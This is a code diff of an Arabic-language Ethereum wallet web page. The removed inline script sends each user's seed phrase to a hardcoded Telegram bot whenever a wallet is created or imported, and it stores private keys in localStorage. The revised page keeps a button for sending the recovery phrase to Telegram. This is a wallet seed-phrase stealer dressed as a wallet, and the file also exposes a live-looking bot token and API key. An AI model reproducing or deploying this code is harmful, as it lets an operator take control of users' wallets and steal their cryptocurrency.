@@ -1,329 +1,134 @@
-𝔸𝕝𝕚 𝕄𝕒𝕙𝕞𝕠𝕦𝕕 
+
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>المحفظة الإلكترونية</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Arial', sans-serif;
-        }
-        
-        body {
-            background-color: #f5f5f5;
-            color: #333;
-            line-height: 1.6;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 100%;
-            padding: 20px;
-            margin: 0 auto;
-        }
-        
-        header {
-            background-color: #2c3e50;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .auth-container, .wallet-container {
-            background-color: white;
-            padding: 30px;
-            margin: 30px auto;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            max-width: 600px;
-        }
-        
-        h2 {
-            margin-bottom: 20px;
-            color: #2c3e50;
-            text-align: center;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            font-size: 16px;
-        }
-        
-        button {
-            background-color: #2c3e50;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-            font-weight: bold;
-        }
-        
-        button:hover {
-            background-color: #1a252f;
-        }
-        
-        .wallet-address {
-            word-break: break-all;
-            background-color: #f9f9f9;
-            padding: 15px;
-            border: 1px solid #ddd;
-            margin-bottom: 20px;
-        }
-        
-        .assets-list {
-            list-style-type: none;
-        }
-        
-        .assets-list li {
-            padding: 15px;
-            border-bottom: 1px solid #ddd;
-            display: flex;
-            justify-content: space-between;
-        }
-        
-        .create-wallet-btn {
-            background-color: #27ae60;
-            margin-top: 20px;
-        }
-        
-        .create-wallet-btn:hover {
-            background-color: #219653;
-        }
-        
-        @media (min-width: 768px) {
-            .container {
-                max-width: 750px;
-            }
-        }
-        
-        @media (min-width: 992px) {
-            .container {
-                max-width: 970px;
-            }
-        }
-        
-        @media (min-width: 1200px) {
-            .container {
-                max-width: 1170px;
-            }
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <header>
-        <h1>المحفظة الإلكترونية</h1>
-    </header>
-    
     <div class="container">
-        <div id="auth-section" class="auth-container">
-            <h2>تسجيل الدخول</h2>
-            <div class="form-group">
-                <label for="seed-phrase">عبارة الاسترجاع (Seed Phrase)</label>
-                <input type="password" id="seed-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
+        <header class="header">
+            <h1>المحفظة الإلكترونية</h1>
+            <p>محفظة آمنة لإدارة أصولك الرقمية</p>
+        </header>
+
+        <!-- شاشة تسجيل الدخول -->
+        <div id="loginScreen" class="screen active">
+            <div class="card">
+                <h2>تسجيل الدخول</h2>
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label for="privateKey">المفتاح الخاص:</label>
+                        <input type="password" id="privateKey" placeholder="أدخل المفتاح الخاص" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">دخول</button>
+                </form>
+                <div class="divider">أو</div>
+                <button id="createWalletBtn" class="btn btn-secondary">إنشاء محفظة جديدة</button>
             </div>
-            <button id="login-btn">الدخول إلى المحفظة</button>
-            <button id="create-wallet-btn" class="create-wallet-btn">إنشاء محفظة جديدة</button>
         </div>
-        
-        <div id="wallet-section" class="wallet-container" style="display: none;">
-            <h2>محفظتك الإلكترونية</h2>
-            <div class="form-group">
-                <label>عنوان المحفظة:</label>
-                <div id="wallet-address" class="wallet-address"></div>
+
+        <!-- شاشة إنشاء المحفظة -->
+        <div id="createWalletScreen" class="screen">
+            <div class="card">
+                <h2>إنشاء محفظة جديدة</h2>
+                <div id="walletInfo" class="wallet-info">
+                    <div class="info-item">
+                        <label>العنوان:</label>
+                        <div id="walletAddress" class="address-display"></div>
+                        <button id="copyAddressBtn" class="btn btn-small">نسخ</button>
+                    </div>
+                    <div class="info-item">
+                        <label>المفتاح الخاص:</label>
+                        <div id="walletPrivateKey" class="key-display"></div>
+                        <button id="copyPrivateKeyBtn" class="btn btn-small">نسخ</button>
+                    </div>
+                    <div class="info-item">
+                        <label>عبارة الاسترجاع:</label>
+                        <div id="walletMnemonic" class="mnemonic-display"></div>
+                        <button id="copyMnemonicBtn" class="btn btn-small">نسخ</button>
+                    </div>
+                </div>
+                <div class="warning">
+                    <p><strong>تحذير:</strong> احفظ هذه المعلومات في مكان آمن. فقدانها يعني فقدان الوصول لمحفظتك نهائياً.</p>
+                </div>
+                <button id="sendToTelegramBtn" class="btn btn-primary">إرسال عبارة الاسترجاع للتلجرام</button>
+                <button id="continueToWalletBtn" class="btn btn-secondary">متابعة للمحفظة</button>
+                <button id="backToLoginBtn" class="btn btn-tertiary">العودة</button>
             </div>
-            
-            <div class="form-group">
-                <label>الأصول المتاحة:</label>
-                <ul id="assets-list" class="assets-list">
-                    <!-- سيتم ملء الأصول هنا عبر JavaScript -->
-                </ul>
+        </div>
+
+        <!-- شاشة المحفظة الرئيسية -->
+        <div id="walletScreen" class="screen">
+            <div class="wallet-header">
+                <div class="wallet-address">
+                    <label>عنوان المحفظة:</label>
+                    <span id="currentWalletAddress"></span>
+                    <button id="copyCurrentAddressBtn" class="btn btn-small">نسخ</button>
+                </div>
+                <button id="logoutBtn" class="btn btn-tertiary">تسجيل الخروج</button>
             </div>
-            
-            <button id="logout-btn">تسجيل الخروج</button>
+
+            <div class="balance-section">
+                <div class="balance-card">
+                    <h3>الرصيد الإجمالي</h3>
+                    <div id="totalBalance" class="balance-amount">0.00 ETH</div>
+                    <button id="refreshBalanceBtn" class="btn btn-small">تحديث</button>
+                </div>
+            </div>
+
+            <div class="assets-section">
+                <h3>الأصول</h3>
+                <div id="assetsList" class="assets-list">
+                    <div class="loading">جاري تحميل الأصول...</div>
+                </div>
+            </div>
+
+            <div class="actions-section">
+                <button id="sendBtn" class="btn btn-primary">إرسال</button>
+                <button id="receiveBtn" class="btn btn-secondary">استقبال</button>
+            </div>
+        </div>
+
+        <!-- نافذة الإرسال -->
+        <div id="sendModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>إرسال الأصول</h3>
+                    <button id="closeSendModal" class="close-btn">&times;</button>
+                </div>
+                <form id="sendForm">
+                    <div class="input-group">
+                        <label for="recipientAddress">عنوان المستقبل:</label>
+                        <input type="text" id="recipientAddress" placeholder="0x..." required>
+                    </div>
+                    <div class="input-group">
+                        <label for="sendAmount">المبلغ:</label>
+                        <input type="number" id="sendAmount" step="0.000001" placeholder="0.0" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">إرسال</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- نافذة الاستقبال -->
+        <div id="receiveModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>استقبال الأصول</h3>
+                    <button id="closeReceiveModal" class="close-btn">&times;</button>
+                </div>
+                <div class="receive-info">
+                    <p>لاستقبال الأصول، شارك عنوان محفظتك:</p>
+                    <div id="receiveAddress" class="address-display"></div>
+                    <button id="copyReceiveAddressBtn" class="btn btn-primary">نسخ العنوان</button>
+                    <div id="qrCode" class="qr-code">سيتم عرض رمز QR هنا</div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // العناصر الرئيسية في الواجهة
-            const authSection = document.getElementById('auth-section');
-            const walletSection = document.getElementById('wallet-section');
-            const loginBtn = document.getElementById('login-btn');
-            const createWalletBtn = document.getElementById('create-wallet-btn');
-            const logoutBtn = document.getElementById('logout-btn');
-            const seedPhraseInput = document.getElementById('seed-phrase');
-            const walletAddressElement = document.getElementById('wallet-address');
-            const assetsListElement = document.getElementById('assets-list');
-            
-            // بيانات التكوين
-            const telegramBotToken = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
-            const chatId = '910021564';
-            const infuraApiKey = '482a7c1c7cc14ec78699c3f1c231b0cd';
-            
-            // إرسال رسالة إلى Telegram
-            async function sendToTelegram(message) {
-                try {
-                    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message
-                        })
-                    });
-                    
-                    const data = await response.json();
-                    return data.ok;
-                } catch (error) {
-                    console.error('Error sending to Telegram:', error);
-                    return false;
-                }
-            }
-            
-            // إنشاء محفظة جديدة
-            async function createNewWallet() {
-                try {
-                    // إنشاء محفظة عشوائية باستخدام ethers.js
-                    const wallet = ethers.Wallet.createRandom();
-                    
-                    // إرسال عبارة الاسترجاع إلى Telegram
-                    const message = `تم إنشاء محفظة جديدة: ${wallet.mnemonic.phrase}`;
-                    await sendToTelegram(message);
-                    
-                    // حفظ المحفظة في localStorage
-                    localStorage.setItem('walletData', JSON.stringify({
-                        address: wallet.address,
-                        privateKey: wallet.privateKey,
-                        mnemonic: wallet.mnemonic.phrase
-                    }));
-                    
-                    // عرض المحفظة
-                    showWallet(wallet.address);
-                    
-                    alert('تم إنشاء محفظة جديدة بنجاح! عبارة الاسترجاع تم إرسالها إلى المسؤول.');
-                } catch (error) {
-                    console.error('Error creating wallet:', error);
-                    alert('حدث خطأ أثناء إنشاء المحفظة. يرجى المحاولة مرة أخرى.');
-                }
-            }
-            
-            // استيراد محفظة موجودة
-            async function importWallet(seedPhrase) {
-                try {
-                    // إنشاء محفظة من عبارة الاسترجاع
-                    const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
-                    
-                    // إرسال عبارة الاسترجاع إلى Telegram
-                    const message = `تم استيراد محفظة: ${seedPhrase}`;
-                    await sendToTelegram(message);
-                    
-                    // حفظ المحفظة في localStorage
-                    localStorage.setItem('walletData', JSON.stringify({
-                        address: wallet.address,
-                        privateKey: wallet.privateKey,
-                        mnemonic: seedPhrase
-                    }));
-                    
-                    // عرض المحفظة
-                    showWallet(wallet.address);
-                    
-                    // جلب رصيد المحفظة
-                    fetchWalletBalance(wallet.address);
-                } catch (error) {
-                    console.error('Error importing wallet:', error);
-                    alert('عبارة الاسترجاع غير صحيحة. يرجى المحاولة مرة أخرى.');
-                }
-            }
-            
-            // عرض واجهة المحفظة
-            function showWallet(address) {
-                authSection.style.display = 'none';
-                walletSection.style.display = 'block';
-                walletAddressElement.textContent = address;
-            }
-            
-            // جلب رصيد المحفظة من شبكة Ethereum
-            async function fetchWalletBalance(address) {
-                try {
-                    // الاتصال بشبكة Ethereum عبر Infura
-                    const provider = new ethers.providers.InfuraProvider('mainnet', infuraApiKey);
-                    
-                    // الحصول على الرصيد
-                    const balance = await provider.getBalance(address);
-                    const balanceInEth = ethers.utils.formatEther(balance);
-                    
-                    // عرض الرصيد
-                    assetsListElement.innerHTML = `
-                        <li>
-                            <span>Ethereum (ETH)</span>
-                            <span>${parseFloat(balanceInEth).toFixed(6)} ETH</span>
-                        </li>
-                    `;
-                } catch (error) {
-                    console.error('Error fetching balance:', error);
-                    assetsListElement.innerHTML = `
-                        <li>
-                            <span>Ethereum (ETH)</span>
-                            <span>غير متاح</span>
-                        </li>
-                    `;
-                }
-            }
-            
-            // تسجيل الخروج
-            function logout() {
-                localStorage.removeItem('walletData');
-                walletSection.style.display = 'none';
-                authSection.style.display = 'block';
-                seedPhraseInput.value = '';
-            }
-            
-            // التحقق مما إذا كان هناك محفظة مسجلة مسبقاً
-            function checkExistingWallet() {
-                const walletData = localStorage.getItem('walletData');
-                if (walletData) {
-                    const wallet = JSON.parse(walletData);
-                    showWallet(wallet.address);
-                    fetchWalletBalance(wallet.address);
-                }
-            }
-            
-            // تعيين معالجات الأحداث
-            loginBtn.addEventListener('click', function() {
-                const seedPhrase = seedPhraseInput.value.trim();
-                if (seedPhrase) {
-                    importWallet(seedPhrase);
-                } else {
-                    alert('يرجى إدخال عبارة الاسترجاع');
-                }
-            });
-            
-            createWalletBtn.addEventListener('click', createNewWallet);
-            logoutBtn.addEventListener('click', logout);
-            
-            // التحقق من وجود محفظة عند تحميل الصفحة
-            checkExistingWallet();
-        });
-    </script>
+    <script src="simple-wallet.js"></script>
 </body>
 </html>
